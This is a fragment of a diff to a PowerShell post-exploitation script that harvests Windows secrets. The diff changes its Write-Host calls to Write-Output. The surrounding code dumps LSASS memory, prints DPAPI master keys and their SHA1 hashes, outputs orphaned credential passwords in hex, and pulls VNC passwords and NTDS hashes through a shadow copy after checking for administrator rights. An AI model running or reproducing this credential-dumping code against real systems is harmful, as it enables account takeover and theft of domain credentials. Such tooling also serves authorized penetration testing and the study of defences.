+					If ($OrphanedCred["Password"]) { Write-Output ("`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["Password"]).Replace("-", ""))) } Else { Write-Output ("`tHex Pwd = None") }
 				}
 				"DPAPI"
 				{
-					Write-Host ("`t*** DPAPI Credential ***" -f ($DPAPINb))
+					Write-Output ("`t*** DPAPI Credential ***" -f ($DPAPINb))
 
-					Write-Host ("`tMasterKey GUID = {0}" -f ($OrphanedCred["Key_GUID"]))
-					Write-Host ("`tMasterKey = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["MasterKey"]).Replace("-", "")))
-					Write-Host ("`tSHA1 MasterKey = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["SHA1_MasterKey"]).Replace("-", "")))
+					Write-Output ("`tMasterKey GUID = {0}" -f ($OrphanedCred["Key_GUID"]))
+					Write-Output ("`tMasterKey = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["MasterKey"]).Replace("-", "")))
+					Write-Output ("`tSHA1 MasterKey = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["SHA1_MasterKey"]).Replace("-", "")))
 				}
 			}
 		}
@@ -10155,7 +10155,7 @@ function Parse-LSASS($Dump)
 #>
 function Get-LSASS($Method)
 {
-	Write-Host ("`n[===] Get LSASS secrets using {0} method [===]" -f ($Method))
+	Write-Output ("`n[===] Get LSASS secrets using {0} method [===]" -f ($Method))
 
 	$Dump = Dump-LSASS($Method)
 	If ($Dump)
@@ -10376,7 +10376,7 @@ function Get-WindowsSecrets()
 	$CurrentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 	If (-not $CurrentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
 	{
-		Write-Host ("`n[ERROR] Script must be run with administrator privileges. Exit`n")
+		Write-Output ("`n[ERROR] Script must be run with administrator privileges. Exit`n")
 		Exit
 	}
 
@@ -10445,7 +10445,7 @@ function Get-WindowsSecrets()
 				}
 				Catch
 				{
-					Write-Host ("`n[WARNING] User '{0}' do not exist" -f ($User))
+					Write-Output ("`n[WARNING] User '{0}' do not exist" -f ($User))
 				}
 			}
 		}
@@ -10493,7 +10493,7 @@ function Get-WindowsSecrets()
 				}
 				Catch
 				{
-					Write-Host ("`n[WARNING] User '{0}' do not exist" -f ($User))
+					Write-Output ("`n[WARNING] User '{0}' do not exist" -f ($User))
 				}
 			}
 		}
@@ -10506,5 +10506,5 @@ function Get-WindowsSecrets()
 	Get-VNCPwds
 	$Users = Get-NTDS -Method "Shadow Copy" $BootKey
 
-	Write-Host ""
+	Write-Output ""
 }
